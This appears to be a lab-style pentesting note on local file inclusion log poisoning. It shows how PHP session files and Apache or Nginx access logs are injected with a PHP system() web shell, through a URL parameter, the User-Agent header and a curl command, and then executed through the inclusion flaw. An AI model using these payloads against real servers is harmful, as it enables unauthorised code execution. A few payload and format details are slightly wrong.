---
title: d-Log Poisoning
draft: false
tags:
  - lfi
---
We will talk about the concept of writing PHP code in a field we control that gets logged into a log file.

We can include that log file to execute PHP code later.

For this attack to work, PHP web app should have read privileges over the logged files.

## PHP Session Poisoning

Most PHP web apps use `PHPSESSID` cookies and these details are stored in `session` files on the back end.

- On Linux - `/var/lib/php/sessions`
- On Windows - `C:\Windows\Temp`

The name of the files that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix.

For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

First thing we do in a PHP sessions poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison.

In our example, `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, which should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`.

Let's try to include this session files through LFI:

```URL
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

Our session file reads as below:

```
pagejs:6:"en.php";preferencejs:7:"English";
```

We can see the session file contains two values:

- `page` - Shows the selected language page.
- `preference` - Shows the selected language.

`page` value is under our control, while `preference` value is not.

We can control `page` value through the `?language=` parameter.

Let's try setting the value of `page` a custom value:

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

If we include the session file once again:

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

We can see that the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file:

```
pagejs:17:"session_poisoning";preferencejs:7:"English";
```

Now let's write a PHP code to the session file by changing the `?language=` parameter to URL encoded web shell:

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use the `&cmd=id` to execute a commands:

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

> Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.



## Server Log Poisoning

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`.

The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

For us to read the poisoned log file through LFI, we need to have read-access over the logs.

For Nginx, low privilege users such as www-data can read logs. However, for Apache, only high privileged users can read the logs.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.

Now let's exploit.

Intercept the LFI traffic with Burp Suite and modify the `User-Agent` header to `Apache Log Poisoning`:

```
GET /index.php?language=/var/log/apache2/access.log HTTP/1.1
User-Agent: Apache Log Poisoning
```

Upon sending the traffic, as expected, our custom User-Agent value is visible in the included log file.

Now, we can poison the `User-Agent` header by setting it to a basic PHP web shell:

```
GET /index.php?language=/var/log/apache2/access.log HTTP/1.1
User-Agent: <?php system($_GET['cmd'])' ?>
```

We may also poison the log by sending a request through cURL, as follows:

```shell-session
jadu101@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`?cmd=id`):

```
GET /index.php?language=/var/log/apache2/access.log&cmd=whoami HTTP/1.1
```

> **Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

We first try to read above logs through LFI, and if we can, we poison them.
